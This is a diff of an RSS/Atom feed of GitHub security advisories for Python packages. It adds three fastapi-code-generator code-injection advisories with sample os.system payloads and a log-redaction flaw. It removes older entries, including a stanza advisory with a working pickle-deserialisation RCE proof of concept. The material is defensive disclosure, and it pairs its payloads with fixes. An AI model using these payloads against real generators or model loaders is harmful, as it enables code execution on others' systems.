@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-11-09T09:13:48.078Z</updated>
+    <updated>2026-11-09T20:27:28.818Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,212 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[fastapi-code-generator] fastapi-code-generator: Import-time RCE via route path -> unescaped @app.get('...') decorator]]></title>
+        <id>https://github.com/advisories/GHSA-p2mm-64f6-gmpp</id>
+        <link href="https://github.com/advisories/GHSA-p2mm-64f6-gmpp"/>
+        <updated>2026-11-09T19:48:09.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>fastapi-code-generator</td>
+<td><code>&lt; 0.8.1</code></td>
+<td><code>0.8.1</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>fastapi-code-generator (koxudaxi) emits the OpenAPI path into the generated main.py route decorator as a single-quoted string literal (<code>@app.get('/u/&lt;path&gt;/x')</code>) without escaping the <code>'</code>. A <code>'</code> in the path closes the decorator string and, via concatenation, injects a live expression that the decorator argument evaluates when main.py is imported (the ASGI server imports it at startup) -- code execution, no request needed. The path is a pure data field. Verified on fastapi-code-generator 0.8.0 / Python 3 / FastAPI.</p>
+<h3 id="details">Details</h3>
+<pre><code class="language-python">@app.get('/u/'+(__import__("os").system('…') or "")+'/x', response_model=None)
+def get_thing() -&gt; None:
+ pass
+</code></pre>
+<p>The generator post-processes output with black/isort, so a syntax-breaking payload aborts generation (DoS); a valid-Python concat (<code>'+expr+'</code>, kept valid with <code>(… or "")</code>) is written and runs at import. info.description (<code>description='…'</code>), tags, and parameter defaults are <code>'</code>-escaped; the path in @app.get('…') is the unescaped sink. Models come from datamodel-code-generator (repr-escaped, no RCE).</p>
+<p>Not a duplicate: distinct product from OpenAPI Generator's python-fastapi backend (different codebase/template/decorator); and distinct from the operation-summary docstring sink in the same product.</p>
+<h3 id="poc">PoC</h3>
+<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the app and merely imports main.py; the injected expression runs at decorator evaluation and writes a marker. Verified on 0.8.0.</p>
+<h3 id="impact">Impact</h3>
+<p>Code execution at import/startup in any application/CI that generates a FastAPI app with fastapi-code-generator from an attacker-controlled or attacker-influenced spec and imports/serves it. Estimated Critical, e.g. <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code>.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Escape the path for the Python string literal (escape ', , newlines via repr) before emitting @app.get('…'), and validate path characters.</p>
+<p><a href="https://github.com/user-attachments/files/29534357/maintainer-report.txt">maintainer-report.txt</a>
+<a href="https://github.com/user-attachments/files/29534358/make_spec.py">make_spec.py</a>
+<a href="https://github.com/user-attachments/files/29534359/reproduce.sh">reproduce.sh</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/security/advisories/GHSA-p2mm-64f6-gmpp">https://github.com/koxudaxi/fastapi-code-generator/security/advisories/GHSA-p2mm-64f6-gmpp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63471">https://nvd.nist.gov/vuln/detail/CVE-2026-63471</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/commit/49301dbdb82170d7f50877419d994b05cb1fa2bc">https://github.com/koxudaxi/fastapi-code-generator/commit/49301dbdb82170d7f50877419d994b05cb1fa2bc</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/commit/b3b9bd66e0b0c4d8c686fda700258104615a1332">https://github.com/koxudaxi/fastapi-code-generator/commit/b3b9bd66e0b0c4d8c686fda700258104615a1332</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/releases/tag/0.8.1">https://github.com/koxudaxi/fastapi-code-generator/releases/tag/0.8.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-p2mm-64f6-gmpp">https://github.com/advisories/GHSA-p2mm-64f6-gmpp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p2mm-64f6-gmpp</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-11-09T19:48:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fastapi-code-generator] fastapi-code-generator: Import-time RCE via response status-code key -> unescaped @app.get(..., responses={...}) dict]]></title>
+        <id>https://github.com/advisories/GHSA-6xmv-cjr5-w3q8</id>
+        <link href="https://github.com/advisories/GHSA-6xmv-cjr5-w3q8"/>
+        <updated>2026-11-09T19:46:28.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>fastapi-code-generator</td>
+<td><code>&lt; 0.8.1</code></td>
+<td><code>0.8.1</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>fastapi-code-generator (koxudaxi) emits an operation's extra responses into the route decorator's responses={...} dict, using each response's status-code key as a single-quoted string literal without escaping the '. A ' in a status-code key closes the dict-key string and, via concatenation, injects a live expression that the decorator argument evaluates when main.py is imported (the ASGI server imports it at startup) -- code execution, no request. The status-code key is a pure data field. Verified on
+fastapi-code-generator 0.8.0 / Python 3 / FastAPI.</p>
+<h3 id="details">Details</h3>
+<pre><code class="language-python">@app.get(
+ '/u', response_model=None,
+ responses={
+ '404' + (__import__("os").system('…') or "") + 'x': {'model': Thing}
+ },
+)
+def get_thing() -&gt; None:
+ pass
+</code></pre>
+<p>The responses={...} dict is emitted only when the operation has a second (non-primary) response, so the malicious key is any additional response status. The generator post-processes with black/isort, so a syntax-breaking payload aborts generation (DoS); a valid-Python concat ('+expr+', kept valid with (... or "")) is written and runs at import. The response content-type key is NOT a sink (normalized to 'model'). info.* are repr-escaped; operationId -&gt; function_name fails closed (DoS-resistant).</p>
+<p>Not a duplicate: same product as the path -&gt; @app.get('…') and summary -&gt; handler-docstring findings, but a different field (response status-code key) and position (the responses={...} decorator dict key). Distinct from OpenAPI Generator's python-fastapi. Models come from datamodel-code-generator (repr-escaped).</p>
+<h3 id="poc">PoC</h3>
+<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the app and merely imports main.py; the injected expression runs at decorator evaluation and writes a marker. Verified on 0.8.0.</p>
+<h3 id="impact">Impact</h3>
+<p>Code execution at import/startup in any application/CI that generates a FastAPI app with
+fastapi-code-generator from an attacker-controlled or attacker-influenced spec (multi-response operation)
+and imports/serves it. Estimated Critical, e.g. <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code>.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Escape each response status-code key for the Python string literal (escape ', , newlines via repr) before emitting the responses={...} dict, and validate that status-code keys are numeric / a known pattern. <a href="https://github.com/user-attachments/files/29534524/maintainer-report.txt">maintainer-report.txt</a> <a href="https://github.com/user-attachments/files/29534526/make_spec.py">make_spec.py</a> <a href="https://github.com/user-attachments/files/29534527/reproduce.sh">reproduce.sh</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/security/advisories/GHSA-6xmv-cjr5-w3q8">https://github.com/koxudaxi/fastapi-code-generator/security/advisories/GHSA-6xmv-cjr5-w3q8</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63469">https://nvd.nist.gov/vuln/detail/CVE-2026-63469</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/commit/49301dbdb82170d7f50877419d994b05cb1fa2bc">https://github.com/koxudaxi/fastapi-code-generator/commit/49301dbdb82170d7f50877419d994b05cb1fa2bc</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/commit/b3b9bd66e0b0c4d8c686fda700258104615a1332">https://github.com/koxudaxi/fastapi-code-generator/commit/b3b9bd66e0b0c4d8c686fda700258104615a1332</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/releases/tag/0.8.1">https://github.com/koxudaxi/fastapi-code-generator/releases/tag/0.8.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-6xmv-cjr5-w3q8">https://github.com/advisories/GHSA-6xmv-cjr5-w3q8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6xmv-cjr5-w3q8</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-11-09T19:46:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fastapi-code-generator] fastapi-code-generator: Call-time RCE via operation summary -> unescaped route-handler docstring]]></title>
+        <id>https://github.com/advisories/GHSA-h667-4jj2-cgv4</id>
+        <link href="https://github.com/advisories/GHSA-h667-4jj2-cgv4"/>
+        <updated>2026-11-09T18:50:01.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>fastapi-code-generator</td>
+<td><code>&lt; 0.8.1</code></td>
+<td><code>0.8.1</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>fastapi-code-generator (koxudaxi) emits an operation's <code>summary</code> as the generated route handler's docstring, using a triple-quoted string without escaping <code>"""</code>. A <code>"""</code> in the summary closes the docstring and, via concatenation, injects a live expression that becomes an expression statement in the handler body -- which runs when the route handler is CALLED (the endpoint is hit). The summary is a pure data field. Verified on fastapi-code-generator 0.8.0 / Python 3 / FastAPI.</p>
+<h3 id="details">Details</h3>
+<pre><code class="language-python">def get_thing() -&gt; None:
+ (
+ """
+ x"""
+ + (__import__("os").system('…') or "")
+ + """y
+ """
+ )
+ pass
+</code></pre>
+<p>The generator post-processes with black/isort, so a syntax-breaking payload aborts generation; a valid-Python breakout (<code>"""+expr+"""</code>, kept valid with <code>(… or "")</code>) is written and executes at call time. info.description, tags, parameter defaults are escaped; operation description is not emitted into the function body; the summary in the handler docstring is the unescaped sink. Models come from datamodel-code-generator (repr-escaped, no RCE).</p>
+<p>Not a duplicate: distinct product from OpenAPI Generator's python-fastapi; and distinct field/sink from the route path -&gt; @app.get('…') decorator (import-time) in the same product -- this is the operation summary in the handler docstring (call-time).</p>
+<h3 id="poc">PoC</h3>
+<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the app and calls the route handler; the injected expression runs and writes a marker. Verified on 0.8.0.</p>
+<h3 id="impact">Impact</h3>
+<p>Code execution on the server when the affected endpoint is invoked, in any app generated with fastapi-code-generator from an attacker-controlled or attacker-influenced spec.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Escape the summary for the docstring context (escape <code>"""</code>/backslashes via repr, or strip triple-quotes) before emitting it as the handler docstring; apply the same to any free-text field rendered into a docstring. <a href="https://github.com/user-attachments/files/29534450/maintainer-report.txt">maintainer-report.txt</a> <a href="https://github.com/user-attachments/files/29534452/make_spec.py">make_spec.py</a>
+<a href="https://github.com/user-attachments/files/29534453/reproduce.sh">reproduce.sh</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/security/advisories/GHSA-h667-4jj2-cgv4">https://github.com/koxudaxi/fastapi-code-generator/security/advisories/GHSA-h667-4jj2-cgv4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63470">https://nvd.nist.gov/vuln/detail/CVE-2026-63470</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/commit/49301dbdb82170d7f50877419d994b05cb1fa2bc">https://github.com/koxudaxi/fastapi-code-generator/commit/49301dbdb82170d7f50877419d994b05cb1fa2bc</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/commit/b3b9bd66e0b0c4d8c686fda700258104615a1332">https://github.com/koxudaxi/fastapi-code-generator/commit/b3b9bd66e0b0c4d8c686fda700258104615a1332</a></li>
+<li><a href="https://github.com/koxudaxi/fastapi-code-generator/releases/tag/0.8.1">https://github.com/koxudaxi/fastapi-code-generator/releases/tag/0.8.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h667-4jj2-cgv4">https://github.com/advisories/GHSA-h667-4jj2-cgv4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h667-4jj2-cgv4</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-11-09T18:50:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[loggingredactor] Logging Redactor: PII data in str/repr of non primitive objects was not being redacted]]></title>
+        <id>https://github.com/advisories/GHSA-w7qv-268h-9h3f</id>
+        <link href="https://github.com/advisories/GHSA-w7qv-268h-9h3f"/>
+        <updated>2026-11-09T18:15:21.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>loggingredactor</td>
+<td><code>&lt; 0.0.7</code></td>
+<td><code>0.0.7</code></td>
+</tr>
+</tbody>
+</table>
+<p>Impact
+PII data in str/repr of non primitive objects was not being redacted, leading to leakage of PII in logs that should have been redacted for custom <code>__str__</code> and <code>__repr__</code> functions</p>
+<p>Patches
+The problem has been patched in version 0.0.7.</p>
+<p>Workarounds
+None without patching.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/armurox/loggingredactor/security/advisories/GHSA-w7qv-268h-9h3f">https://github.com/armurox/loggingredactor/security/advisories/GHSA-w7qv-268h-9h3f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63417">https://nvd.nist.gov/vuln/detail/CVE-2026-63417</a></li>
+<li><a href="https://github.com/armurox/loggingredactor/issues/12">https://github.com/armurox/loggingredactor/issues/12</a></li>
+<li><a href="https://github.com/armurox/loggingredactor/pull/15">https://github.com/armurox/loggingredactor/pull/15</a></li>
+<li><a href="https://github.com/armurox/loggingredactor/commit/361a528e56437b9c269e69f3863de4b3e568391b">https://github.com/armurox/loggingredactor/commit/361a528e56437b9c269e69f3863de4b3e568391b</a></li>
+<li><a href="https://github.com/armurox/loggingredactor/releases/tag/0.0.7">https://github.com/armurox/loggingredactor/releases/tag/0.0.7</a></li>
+<li><a href="https://github.com/advisories/GHSA-w7qv-268h-9h3f">https://github.com/advisories/GHSA-w7qv-268h-9h3f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w7qv-268h-9h3f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-09T18:15:18.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[paramiko] Paramiko rsakey.py allows the SHA-1 algorithm]]></title>
         <id>https://github.com/advisories/GHSA-r374-rxx8-8654</id>
@@ -1097,209 +1303,5 @@ curl -s -X POST http://target:8080/api/v1/messages \
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-06-20T18:31:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[stanza] Stanza: RCE via pickle deserialization in the lemmatizer]]></title>
-        <id>https://github.com/advisories/GHSA-gh9r-c94j-cmp5</id>
-        <link href="https://github.com/advisories/GHSA-gh9r-c94j-cmp5"/>
-        <updated>2026-11-03T20:29:16.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>stanza</td>
-<td><code>= 1.14.0</code></td>
-<td><code>1.15.0</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="tldr">TL;DR</h2>
-<p>Loading an attacker-supplied lemma <code>.pt</code> runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores <code>pos_dict</code> as a gzip-compressed pickle in the checkpoint's <code>dicts</code> field (a <code>bytes</code> value). <code>torch.load(weights_only=True)</code> treats <code>bytes</code> as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. <code>Trainer.load</code> then feeds those bytes to an <strong>unrestricted <code>pickle.loads</code></strong>: the only bare <code>pickle.loads</code> in the tree. Result: <code>weights_only=True</code> gives no protection here, and model loading executes code.</p>
-<p>Confirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload <code>__reduce__</code> returns <code>(os.system, (cmd,))</code> ran the command at load time (marker file showed <code>uid=501(...)</code>, <code>executed_by=...</code>).</p>
-<p>A downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. <code>stanza.Pipeline(lang=..., processors="tokenize,pos,lemma", lemma_model_path="&lt;attacker-influenced .pt&gt;")</code> (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into <code>Trainer.load</code> -&gt; <code>_unpack_pos_dict</code> and executes the embedded pickle at construction time.</p>
-<h2 id="the-vulnerable-path">The vulnerable path</h2>
-<p><code>stanza/models/lemma/trainer.py</code>:</p>
-<pre><code class="language-python"># _pack_pos_dict (write side): pos_dict -&gt; pickle -&gt; gzip -&gt; bytes, stored under checkpoint['dicts']
-
-def _unpack_pos_dict(data):                 # line 54
-    buf = io.BytesIO(data)
-    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
-        raw = gz.read()
-    return pickle.loads(raw)                # &lt;-- unrestricted default unpickler
-</code></pre>
-<pre><code class="language-python">def load(self, filename, ...):              # line 365
-    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact
-    ...
-    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)
-        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validation
-</code></pre>
-<p><strong>Reachable from the documented API.</strong> <code>stanza.Pipeline(..., lemma_model_path=&lt;file&gt;)</code> -&gt; <code>LemmaProcessor._set_up_model</code> -&gt; <code>Trainer(model_file=…)</code> -&gt; <code>Trainer.load</code>. Any shared/distributed checkpoint, custom registry, or caller-supplied <code>lemma_model_path</code> reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.</p>
-<p>Note: this is <strong>not</strong> the <code>weights_only=False</code> fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.</p>
-<h2 id="minimal-poc">Minimal PoC</h2>
-<pre><code class="language-python">import gzip, io, os, pickle, tempfile, torch
-from stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS
-
-MARKER = os.path.join(tempfile.gettempdir(), "stanza_lemma_poc_pwned")
-
-class Payload:
-    def __reduce__(self):
-        return (os.system, ("id &gt; %s 2&gt;&amp;1; echo executed_by=$(whoami) &gt;&gt; %s" % (MARKER, MARKER),))
-
-buf = io.BytesIO()
-with gzip.GzipFile(fileobj=buf, mode="wb") as gz:        # same shape as _pack_pos_dict()
-    gz.write(pickle.dumps(Payload(), protocol=4))
-
-ckpt = {"dicts": buf.getvalue(), "dicts_version": _DICTS_VERSION_POS}
-pt = os.path.join(tempfile.gettempdir(), "evil_lemma.pt")
-torch.save(ckpt, pt, _use_new_zipfile_serialization=False)
-
-loaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact
-_unpack_pos_dict(loaded["dicts"])                            # == trainer.py:378 -&gt; command runs
-print("pwned:", open(MARKER).read().strip())
-</code></pre>
-<p>The PoC calls <code>_unpack_pos_dict</code> directly: the exact expression at <code>trainer.py:378</code>. Reaching it through <code>stanza.Pipeline(...)</code> additionally requires the crafted file to carry a well-formed <code>config</code>/<code>vocab</code> so <code>load</code> runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.</p>
-<h2 id="fix">Fix</h2>
-<p>Deserialize the inner stream with the <code>RestrictedUnpickler</code> the project already uses in <code>stanza/models/common/doc.py</code> (allowlists <code>tuple</code>/<code>list</code>/<code>dict</code> only):</p>
-<pre><code class="language-python">from stanza.models.common.doc import RestrictedUnpickler
-
-def _unpack_pos_dict(data):
-    buf = io.BytesIO(data)
-    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
-        raw = gz.read()
-    return RestrictedUnpickler(io.BytesIO(raw)).load()
-</code></pre>
-<p>A legitimate <code>pos_dict</code> is a nested <code>{pos: {word: lemma}}</code> string mapping no class/function globals, so it loads cleanly, while any <code>os.system</code>-style payload is rejected by <code>find_class</code>. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both <code>_unpack_pos_dict</code> and, for forward compatibility, <code>_pack_pos_dict</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/stanfordnlp/stanza/security/advisories/GHSA-gh9r-c94j-cmp5">https://github.com/stanfordnlp/stanza/security/advisories/GHSA-gh9r-c94j-cmp5</a></li>
-<li><a href="https://github.com/stanfordnlp/stanza/pull/1649">https://github.com/stanfordnlp/stanza/pull/1649</a></li>
-<li><a href="https://github.com/stanfordnlp/stanza/commit/b21e1c9b47b4fccff21d3b0a6c0687a19410c2f0">https://github.com/stanfordnlp/stanza/commit/b21e1c9b47b4fccff21d3b0a6c0687a19410c2f0</a></li>
-<li><a href="https://github.com/stanfordnlp/stanza/releases/tag/v1.15.0">https://github.com/stanfordnlp/stanza/releases/tag/v1.15.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-gh9r-c94j-cmp5">https://github.com/advisories/GHSA-gh9r-c94j-cmp5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gh9r-c94j-cmp5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-03T20:29:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[picklescan] Duplicate Advisory : Picklescan is missing detection when calling built-in python idlelib.pyshell.ModifiedInterpreter.runcode]]></title>
-        <id>https://github.com/advisories/GHSA-mq7r-vm99-p7vx</id>
-        <link href="https://github.com/advisories/GHSA-mq7r-vm99-p7vx"/>
-        <updated>2026-11-03T17:37:07.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>picklescan</td>
-<td><code>&lt; 0.0.30</code></td>
-<td><code>0.0.30</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="duplicate-advisory">Duplicate Advisory</h3>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-3gf5-cxq9-w223. This link is maintained to preserve external references.</p>
-<h3 id="original-description">Original Description</h3>
-<p>picklescan through 0.0.26 fails to detect malicious pickle files that invoke idlelib.pyshell.ModifiedInterpreter.runcode in <strong>reduce</strong> methods. Attackers can embed undetected code in pickle files that executes arbitrary commands when the file is loaded via pickle.load(), enabling supply chain attacks on PyTorch models and saved Python objects. This is fixed in version 0.0.30.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-3gf5-cxq9-w223">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-3gf5-cxq9-w223</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71340">https://nvd.nist.gov/vuln/detail/CVE-2025-71340</a></li>
-<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-idlelib-pyshell-modifiedinterpreter-runcode">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-idlelib-pyshell-modifiedinterpreter-runcode</a></li>
-<li><a href="https://github.com/advisories/GHSA-mq7r-vm99-p7vx">https://github.com/advisories/GHSA-mq7r-vm99-p7vx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mq7r-vm99-p7vx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-26T00:32:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[feast] Feast vulnerable to arbitrary code execution via unsafe deserialization of dill-serialized UDFs]]></title>
-        <id>https://github.com/advisories/GHSA-gg2p-37pv-v7fq</id>
-        <link href="https://github.com/advisories/GHSA-gg2p-37pv-v7fq"/>
-        <updated>2026-11-03T16:23:47.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>feast</td>
-<td><code>&lt; 0.67.0</code></td>
-<td><code>0.67.0</code></td>
-</tr>
-</tbody>
-</table>
-<p>A flaw was found in Feast. The system improperly deserializes user-defined functions (UDFs) stored in its registry, which are serialized using the 'dill' library. This allows a remote attacker to store a malicious UDF, leading to unauthenticated arbitrary code execution on the feature server in default configurations. An authenticated attacker can also achieve arbitrary code execution on the registry server by bypassing authorization checks during deserialization. This vulnerability can result in cross-tenant data access and lateral movement within the system.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-18948">https://nvd.nist.gov/vuln/detail/CVE-2026-18948</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-18948">https://access.redhat.com/security/cve/CVE-2026-18948</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2511167">https://bugzilla.redhat.com/show_bug.cgi?id=2511167</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:53263">https://access.redhat.com/errata/RHSA-2026:53263</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:53261">https://access.redhat.com/errata/RHSA-2026:53261</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:53262">https://access.redhat.com/errata/RHSA-2026:53262</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:60520">https://access.redhat.com/errata/RHSA-2026:60520</a></li>
-<li><a href="https://github.com/feast-dev/feast/issues/6827">https://github.com/feast-dev/feast/issues/6827</a></li>
-<li><a href="https://github.com/feast-dev/feast/pull/6861">https://github.com/feast-dev/feast/pull/6861</a></li>
-<li><a href="https://github.com/feast-dev/feast/commit/e0ef16ea1ed149ecd5dc9d4d0aa0fdbfa547f861">https://github.com/feast-dev/feast/commit/e0ef16ea1ed149ecd5dc9d4d0aa0fdbfa547f861</a></li>
-<li><a href="https://github.com/feast-dev/feast/releases/tag/v0.67.0">https://github.com/feast-dev/feast/releases/tag/v0.67.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-gg2p-37pv-v7fq">https://github.com/advisories/GHSA-gg2p-37pv-v7fq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gg2p-37pv-v7fq</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-10T21:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Authenticated users can bypass the `is_safe_url` check]]></title>
-        <id>https://github.com/advisories/GHSA-6hcw-qqr8-pjj8</id>
-        <link href="https://github.com/advisories/GHSA-6hcw-qqr8-pjj8"/>
-        <updated>2026-11-02T23:08:07.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>apache-airflow</td>
-<td><code>&gt;= 3.0.0b3, &lt; 3.2.2</code></td>
-<td><code>3.2.2</code></td>
-</tr>
-</tbody>
-</table>
-<p>A bug in the login redirect route in Apache Airflow allowed authenticated users to craft URLs that bypassed the <code>is_safe_url</code> check, enabling redirection from a trusted Airflow domain to an attacker-controlled origin. Users are advised to upgrade to <code>apache-airflow</code> 3.2.2 or later. As a defense-in-depth mitigation, deployment operators can place Airflow behind a reverse proxy that strips off-domain <code>next=</code> query parameters before they reach the login endpoint.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40961">https://nvd.nist.gov/vuln/detail/CVE-2026-40961</a></li>
-<li><a href="https://github.com/apache/airflow/pull/65557">https://github.com/apache/airflow/pull/65557</a></li>
-<li><a href="https://lists.apache.org/thread/qmt8ksh7gty6b8hr9w294t94j36jdv1q">https://lists.apache.org/thread/qmt8ksh7gty6b8hr9w294t94j36jdv1q</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/05/31/2">http://www.openwall.com/lists/oss-security/2026/05/31/2</a></li>
-<li><a href="https://github.com/apache/airflow/commit/555f35576e3143dec65a7fb9acd95891841b45f2">https://github.com/apache/airflow/commit/555f35576e3143dec65a7fb9acd95891841b45f2</a></li>
